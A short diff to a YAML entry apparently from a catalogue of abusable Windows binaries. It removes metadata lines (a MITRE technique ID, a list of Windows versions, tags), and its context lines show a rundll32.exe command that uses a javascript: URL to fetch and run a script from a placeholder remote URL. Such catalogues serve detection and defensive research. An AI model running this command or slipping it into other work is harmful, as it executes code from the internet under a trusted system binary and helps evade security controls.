@@ -23,13 +23,6 @@ Commands:
     Tags:
       - Execute: DLL
       - Execute: Remote
-    Usecase: Proxy execution
-    Category: Execute
-    Privileges: User
-    MitreID: T1218.011
-    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
-    Tags:
-      - Execute: JScript
   - Command: rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:{REMOTEURL}")
     Description: Use Rundll32.exe to execute a JavaScript script that calls a remote JavaScript script.
     Usecase: Execute code from Internet
